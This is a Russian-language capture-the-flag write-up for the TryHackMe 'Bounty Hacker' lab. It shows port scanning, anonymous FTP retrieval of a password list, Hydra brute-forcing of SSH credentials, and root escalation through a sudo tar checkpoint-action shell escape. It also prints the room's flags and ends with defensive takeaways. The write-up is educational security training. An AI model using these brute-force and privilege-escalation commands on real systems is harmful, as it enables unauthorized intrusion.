# Bounty Hacker

**Сложность:** Easy

<img width="130" height="100" alt="image" src="https://github.com/user-attachments/assets/33649d1b-faff-48ba-99a4-9cc6a7336878" />


| | |
|---|---|
| **Платформа** | TryHackMe |
| **Ссылка** | https://tryhackme.com/room/cowboyhacker |
| **ОС** | Linux |
| **Теги** | `ftp`, `bruteforce`, `ssh`, `gtfobins` |

## Кратко

Машина с открытыми FTP, SSH и HTTP. На FTP под анонимным пользователем лежат список возможных паролей и записка с именем автора. Подбор пары логин/пароль через Hydra дает SSH-доступ, а повышение привилегий выполняется через GTFOBins-эксплойт для `tar`, разрешенного в sudo без пароля на конкретную команду.

## 1. Разведка

### Сканирование портов

```bash
nmap 10.82.174.213
```

```
Nmap scan report for 10.82.174.213
Host is up (0.050s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Проверка веб-интерфейса через `gobuster` ничего не дала, кроме директорий `images` и `javascript`; `robots.txt` на сервере отсутствует.

### Исследование FTP

Подключаемся под анонимным пользователем:

```bash
ftp 10.82.174.213
```

```
Connected to 10.82.174.213.
220 (vsFTPd 3.0.5)
Name (10.82.174.213:kali): anonymous
230 Login successful.
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

Скачиваем оба файла:

```bash
ftp> get locks.txt
ftp> get task.txt
```

Содержимое `locks.txt` — список из 26 строк, похожий на словарь паролей (вероятно, от SSH).

Содержимое `task.txt`:

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Явных зацепок, кроме имени автора — `lin`, нет. Используем его как предполагаемое имя пользователя SSH.

## 2. Получение доступа

Перебираем пароль по словарю `locks.txt` для пользователя `lin` через Hydra:

```bash
hydra -l lin -P locks.txt ssh://10.82.174.213 -t 3
```

```
[22][ssh] host: 10.82.174.213   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

Пароль подобран: `RedDr4gonSynd1cat3`. Подключаемся по SSH:

```bash
ssh lin@10.82.174.213 -p 22
```

```
lin@ip-10-82-174-213:~/Desktop$ ls
user.txt
lin@ip-10-82-174-213:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

**Флаг пользователя:** `THM{CR1M3_SyNd1C4T3}`

## 3. Повышение привилегий

Проверяем доступные sudo-права:

```bash
sudo -l
```

```
User lin may run the following commands on ip-10-82-174-213:
    (root) /bin/tar
```

Пользователю разрешено запускать `tar` от имени root. Используем готовый вектор повышения привилегий для `tar` с **GTFOBins**:

```bash
sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
tar: Removing leading `/' from member names
# whoami
root
# cd /root
# ls
root.txt  snap
# cat root.txt
THM{80UN7Y_h4cK3r}
```

**Флаг root:** `THM{80UN7Y_h4cK3r}`

## Выводы

- Анонимный доступ к FTP раскрыл словарь паролей и подсказку по имени пользователя — комбинация, которая закрывает подбор учетных данных почти полностью.
- Разрешение в sudo на запуск `tar` без ограничений по аргументам — классический вектор privesc через `--checkpoint-action`, задокументированный в GTFOBins.
- Для защиты: не хранить списки паролей в открытом доступе, ограничивать sudo-правила конкретными аргументами или скриптами, а не всей утилитой целиком.

## Использованные инструменты

`nmap`, `gobuster`, `ftp`, `hydra`, `ssh`, GTFOBins
